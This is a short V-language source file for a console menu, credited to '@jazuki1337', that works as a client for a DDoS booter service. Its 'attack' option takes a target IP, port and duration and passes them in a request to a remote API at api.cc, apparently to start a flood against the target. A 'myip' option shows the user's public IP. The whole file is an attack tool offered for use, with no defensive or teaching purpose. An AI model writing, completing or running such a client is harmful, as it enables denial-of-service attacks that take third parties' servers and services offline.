import net.http
import os

fn main() {
    mut prnt := '\x1b[95m ╔═════════════════\e[37m═════════════════╗  \x1b[95m\r\n'
    prnt += '\x1b[95m ║        PUT YOUR MET\e[37mHODS HERE     ║  \x1b[95m\r\n'
	prnt += '\x1b[95m ╚═════════════════\e[37m═════════════════╝  \x1b[95m\r\n'
    for ;; {
        println(prnt)
        println('\x1b[0;35m╔═[\x1b[32m{Made By @jazuki1337} \x1b[0;35m]═\x1b[32m$\x1b[0;35m╚══\x1b[32m>\x1b[1;37m')

        methods := os.input('Enter Method: ')
        if methods == "attack"{
        mut ip := os.input('Enter a ip: ')
        mut port := os.input('Enter a port: ')
        mut time := os.input('Enter a time: ')
        http.get_text('https://api.cc/api.php?&ip=' + ip + '&port=' + port + '&time=' + time + '&method=' + methods)
    }
    if methods == "myip"{
        wws := http.get_text('https://api.my-ip.io/ip')
    mut myip := '\x1b[95m ╔══════════════════════════════════╗  \r\n'
    myip += '\x1b[95m ║\x1b[96m Your ip is [\x1b[31m$wws\x1b[95m\x1b[96m]\x1b[95m     ║  \r\n'
    myip += '\x1b[95m ╚══════════════════════════════════╝\r\n'
    myip += '\x1b[37m\r\n'
    println(myip)
  }
 }
} 
